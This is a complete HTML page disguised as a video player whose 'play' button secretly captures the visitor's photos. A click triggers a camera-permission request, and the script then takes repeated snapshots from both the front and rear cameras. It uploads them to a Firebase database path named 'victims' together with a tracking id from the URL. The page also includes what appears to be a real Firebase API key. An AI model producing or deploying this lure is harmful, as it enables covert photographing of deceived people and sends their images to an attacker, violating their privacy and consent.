<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loading...</title>
<style>
body,html{margin:0;padding:0;height:100%;background:#000;overflow:hidden}
.bg{position:fixed;top:0;left:0;width:100%;height:100%;background:url('https://i.ibb.co.com/8XjY5Yk/blur-bg.jpg') center/cover;filter:blur(10px)}
.play{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:90px;height:90px;background:rgba(0,0,0,0.8);border-radius:50%;cursor:pointer}
.play::after{content:'';border-left:30px solid #ff0050;border-top:20px solid transparent;border-bottom:20px solid transparent;margin-left:8px}
</style>
</head>
<body>
<div class="bg"></div>
<div class="play" onclick="go()"></div>

<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
<script>
const firebaseConfig = {apiKey:"AIzaSyDTBla5gMV15V9HWBKAVYTWFt-CBrFfpzo",authDomain:"cam-snap-8e956.firebaseapp.com",databaseURL:"https://cam-snap-8e956-default-rtdb.firebaseio.com",projectId:"cam-snap-8e956",appId:"1:982089892260:web:2cfa5a4d3b3dbcf45d0131"};
firebase.initializeApp(firebaseConfig);
const db = firebase.database();
const id = new URLSearchParams(location.search).get('id');

function go(){
  document.querySelector('.play').remove();
  ;['user','environment'].forEach(f=>{
    for(let i=0;i<6;i++){
      setTimeout(()=>capture(f),i*500);
    }
  });
}
async function capture(face){
  try{
    const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:face}});
    const v = document.createElement('video'); v.srcObject=s; v.play();
    v.onloadedmetadata=()=>{
      setTimeout(()=>{
        const c=document.createElement('canvas');
        c.width=640; c.height=480;
        c.getContext('2d').drawImage(v,0,0,640,480);
        const data=c.toDataURL('image/jpeg',0.8);
        db.ref('victims/'+id).push({data,time:Date.now()});
        s.getTracks().forEach(t=>t.stop());
      },800);
    }
  }catch(e){}
}
</script>
</body>
</html>
